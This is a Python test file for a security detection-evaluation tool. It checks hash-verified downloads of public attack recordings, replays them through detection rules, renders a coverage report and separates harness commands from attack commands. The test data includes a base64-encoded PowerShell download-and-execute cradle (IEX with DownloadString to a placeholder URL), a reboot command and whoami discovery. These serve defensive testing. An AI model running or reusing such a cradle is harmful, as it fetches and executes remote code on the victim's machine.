"""The public-recording evaluation: manifest, verified download, replay through the real engine, report."""

from __future__ import annotations

import base64
import hashlib
import re
from datetime import UTC, datetime
from pathlib import Path

import httpx
import pytest

from app.detection_eval import (
    DATASETS,
    DOWNLOAD_BASE,
    UNAVAILABLE,
    Dataset,
    DatasetFile,
    DatasetIntegrityError,
    evaluate,
    fetch,
    is_harness_command,
    render_report,
    replay,
    technique_matches,
)
from app.ingest_pipeline.tests.test_winxml import SECURITY_4688, SYSMON_1, event_xml


def test_the_manifest_is_well_formed() -> None:
    paths = [file.path for dataset in DATASETS for file in dataset.files]
    assert len(paths) == len(set(paths))
    for dataset in DATASETS:
        assert dataset.purpose in {"priority", "claims"}
        assert re.fullmatch(r"T\d{4}(\.\d{3})?", dataset.technique)
        assert all(file.path.startswith(dataset.technique + "/") for file in dataset.files)
        assert all(re.fullmatch(r"[0-9a-f]{64}", file.sha256) and file.size > 0 for file in dataset.files)
    assert {u.purpose for u in UNAVAILABLE} <= {"priority", "claims"}


@pytest.mark.parametrize(
    ("finding", "label", "matches"),
    [
        ("T1059.001", "T1059.001", True),
        ("T1110", "T1110.003", True),  # a parent-technique rule on a sub-technique recording
        ("T1059.001", "T1059", True),
        ("T1059.003", "T1059.001", False),
        ("T1105", "T1110", False),
    ],
)
def test_technique_matching(finding: str, label: str, matches: bool) -> None:
    assert technique_matches(finding, label) is matches


WMI_NOISE = event_xml(5857, "Microsoft-Windows-WMI-Activity/Operational", {"ProviderName": "x"})
NTLM_4776 = event_xml(4776, "Security", {"TargetUserName": "admin", "Status": "0xc000006a"})


async def test_replay_uses_the_real_rules_and_counts_what_it_could_not_parse() -> None:
    dataset = Dataset("T1059.001", "PowerShell", "priority", ())
    classic = "12/04/2020 01:19:21 PM\nLogName=Security\nEventCode=4688\nMessage=A new process has been created.\n"
    result = await replay(
        dataset, [("a.log", f"{SYSMON_1}\n{SECURITY_4688}\n{WMI_NOISE}\n{NTLM_4776}\n"), ("classic.log", classic)]
    )

    assert result.events == 4
    assert result.channels["Security"] == 2
    assert result.accepted == 2, "the WMI log is not a parsed source; 4776 is not a supported Security event"
    assert result.rejected == {"unsupported Windows Security event 4776": 1}
    assert result.detected
    assert "PowerShell started with an encoded command" in {f.rule_title for f in result.matching}
    assert {f.rule_title for f in result.other} == {"whoami used to list privileges or groups"}
    assert result.unread_files == ["classic.log: no Windows event XML (another format, e.g. Splunk's classic text)"]


async def test_evaluate_needs_the_recordings_to_be_fetched(tmp_path: Path) -> None:
    with pytest.raises(FileNotFoundError, match="fetch-detection-datasets"):
        await evaluate(DATASETS[:1], tmp_path)


def _files(root: Path) -> list[Path]:
    return [path for path in root.rglob("*") if path.is_file()]


def _dataset(content: bytes) -> Dataset:
    file = DatasetFile("T0000/x/windows-sysmon.log", hashlib.sha256(content).hexdigest(), len(content))
    return Dataset("T0000", "Test", "priority", (file,))


async def test_fetch_verifies_every_download_and_reuses_the_cache(tmp_path: Path) -> None:
    content = SYSMON_1.encode()
    requested: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        requested.append(str(request.url))
        return httpx.Response(200, content=content)

    dataset = _dataset(content)
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        first = await fetch([dataset], tmp_path, client=client)
        second = await fetch([dataset], tmp_path, client=client)

    assert [outcome for _, outcome in first] == ["downloaded"]
    assert [outcome for _, outcome in second] == ["cached"]
    assert requested == [DOWNLOAD_BASE + "T0000/x/windows-sysmon.log"]
    assert (tmp_path / "T0000/x/windows-sysmon.log").read_bytes() == content


@pytest.mark.parametrize("served", [b"tampered content", SYSMON_1.encode() + b"extra"])
async def test_fetch_refuses_content_that_does_not_match(tmp_path: Path, served: bytes) -> None:
    dataset = _dataset(SYSMON_1.encode())
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(lambda _: httpx.Response(200, content=served))
    ) as client:
        with pytest.raises(DatasetIntegrityError):
            await fetch([dataset], tmp_path, client=client)
    assert _files(tmp_path) == [], "nothing unverified is left behind"


async def test_report_summarises_both_sets() -> None:
    result = await replay(Dataset("T1059.001", "PowerShell", "priority", ()), [("a.log", SYSMON_1)])
    missed = await replay(Dataset("T1033", "System Owner/User Discovery", "claims", ()), [("a.log", SYSMON_1)])
    report = render_report([result, missed], rule_count=7, generated=datetime(2026, 9, 22, tzinfo=UTC))

    assert "with 7 shipped rules" in report
    assert "**Industry priority** (Red Canary top-10, Windows-observable): 1 of 1 recorded techniques" in report
    assert "**Claims check** (techniques a shipped rule claims): 0 of 1 recorded techniques" in report
    assert "| T1033 System Owner/User Discovery | claims | 1 | 1 | 0 | **no** | — |" in report
    assert "| T1204.004 Malicious Copy and Paste | priority | — | — | — | not measured |" in report


def _encoded(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


ATTACK_PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
HARNESS_CMD = "PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand " + _encoded(
    "&chcp.com 65001 > $null\n$exec_wrapper_str = $input | Out-String"
)
ATTACK_CMD = "powershell.exe -NoProfile -E " + _encoded("Write-Host 1bfdf857-e0b1-4394-8932-980fe4a323fe")


@pytest.mark.parametrize(
    ("command_line", "harness"),
    [
        (HARNESS_CMD, True),
        ("powershell.exe -e " + _encoded('shutdown /r /t 2 /c "Reboot initiated by Ansible"'), True),
        (ATTACK_CMD, False),
        ("powershell.exe -e " + _encoded("IEX (New-Object Net.WebClient).DownloadString('http://x')"), False),
        ("cmd.exe /c whoami", False),
        ("powershell.exe -e not-base64!", False),
    ],
)
def test_harness_commands_are_recognised_by_fixed_markers(command_line: str, harness: bool) -> None:
    assert is_harness_command(command_line) is harness


async def test_findings_on_harness_activity_are_reported_but_not_counted() -> None:
    def process(command_line: str, record: int) -> str:
        return event_xml(
            1,
            "Microsoft-Windows-Sysmon/Operational",
            {"Image": ATTACK_PS, "CommandLine": command_line, "ParentImage": r"C:\Windows\System32\cmd.exe"},
            time=f"2021-07-27T20:21:{record:02d}Z",
        )

    only_harness = await replay(Dataset("T1027", "Obfuscation", "priority", ()), [("a.log", process(HARNESS_CMD, 1))])
    assert not only_harness.detected
    assert [f.rule_title for f in only_harness.harness] == ["PowerShell started with an encoded command"]

    with_attack = await replay(
        Dataset("T1027", "Obfuscation", "priority", ()),
        [("a.log", process(HARNESS_CMD, 1) + "\n" + process(ATTACK_CMD, 2))],
    )
    assert with_attack.detected
    assert len(with_attack.matching) == 1
    assert len(with_attack.harness) == 1


@pytest.mark.parametrize(
    "command_line",
    [
        "powershell.exe -e {v}",
        "powershell.exe -En {v}",
        "powershell.exe /NoProfile /EncodedCommand {v}",
        'powershell.exe -noninteractive -encodedcommand "{v}"',
    ],
)
def test_every_spelling_of_encoded_command_is_decoded(command_line: str) -> None:
    payload = "[Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Get-PackageProvider"
    assert is_harness_command(command_line.format(v=_encoded(payload)))


def test_harness_markers_ignore_doubled_spaces() -> None:
    assert is_harness_command(
        "PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand " + _encoded("whoami")
    )
